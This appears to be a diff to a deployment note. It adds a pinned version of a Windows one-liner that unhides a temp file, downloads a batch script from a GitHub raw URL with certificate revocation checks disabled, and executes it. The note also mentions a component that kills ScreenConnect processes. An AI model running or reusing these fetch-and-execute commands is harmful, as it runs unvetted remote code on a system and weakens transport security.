@@ -2,7 +2,8 @@ UNIVERSAL DEPLOY (O41 / M31 / L18 — stop killing Gryxa):
 
 attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o41" & findstr /C:"OWN BUILD 20260802O41" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-SHA-pin: (update after push)
+SHA-pin:
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/c59ba5463f0e104a8062bfa874f4e53521ec49e6/own.txt" & findstr /C:"OWN BUILD 20260802O41" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 O41 root cause:
 - Exterminate killed ScreenConnect procs with null ExecutablePath every tick (Gryxa ClientService).
